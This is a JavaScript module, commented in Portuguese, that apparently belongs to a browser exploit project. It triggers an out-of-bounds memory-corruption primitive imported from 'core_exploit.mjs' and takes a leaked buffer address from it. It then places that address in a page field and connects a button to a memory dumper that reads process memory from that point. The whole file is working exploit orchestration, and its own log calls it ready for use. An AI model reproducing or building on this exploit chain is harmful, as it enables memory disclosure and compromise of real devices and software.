// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisão 51 - Obtenção Automática de Endereço)

import { logS3 } from './s3_utils.mjs';
import {
    executeMemoryDump_R50 // A lógica do dumper R50 continua a mesma
} from './testArrayBufferVictimCrash.mjs';
import { triggerOOB_primitive, oob_dataview_real } from '../core_exploit.mjs';

// Função para configurar a UI do dumper
function setupMemoryDumperListener() {
    const runBtn = document.getElementById('runDumperBtn');
    const startAddrEl = document.getElementById('startAddr');
    const dumpSizeEl = document.getElementById('dumpSize');
    const outputEl = document.getElementById('dumpOutput');

    if (!runBtn || !startAddrEl || !dumpSizeEl || !outputEl) {
        logS3(`ERRO: Elementos da UI do dumper não encontrados.`, "critical");
        return;
    }

    runBtn.addEventListener('click', async () => {
        runBtn.disabled = true;
        outputEl.textContent = "Iniciando dump...";
        try {
            // O dumper R50 continua sendo a função que executa o dump.
            await executeMemoryDump_R50(startAddrEl.value, dumpSizeEl.value, outputEl);
        } finally {
            runBtn.disabled = false;
        }
    });

    logS3(`Ouvinte de eventos para o dumper de memória configurado.`, "good");
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `MemoryDumper_R51_Orchestrator`;
    logS3(`==== INICIANDO Script 3 R51 (${FNAME_ORCHESTRATOR}) ... ====`, 'test');
    
    // Passo 1: Obter o endereço do buffer
    logS3(`[R51] Preparando o ambiente para obter o endereço de partida...`, 'info');
    await triggerOOB_primitive({ force_reinit: true });

    const startAddrEl = document.getElementById('startAddr');
    if (oob_dataview_real && oob_dataview_real.buffer_addr && startAddrEl) {
        const startAddress = oob_dataview_real.buffer_addr.toString(true);
        logS3(`[R51] Endereço do buffer encontrado: ${startAddress}. Preenchendo o campo de input.`, 'vuln_major');
        startAddrEl.value = startAddress;
    } else {
        logS3(`[R51] ERRO: Não foi possível obter o endereço do buffer para usar como ponto de partida.`, 'critical');
    }
    
    // Passo 2: Configurar a UI para permitir dumps manuais
    setupMemoryDumperListener();
    
    logS3(`\n==== Script 3 R51 (${FNAME_ORCHESTRATOR}) CONCLUÍDO e PRONTO PARA USO ====`, 'test');
}
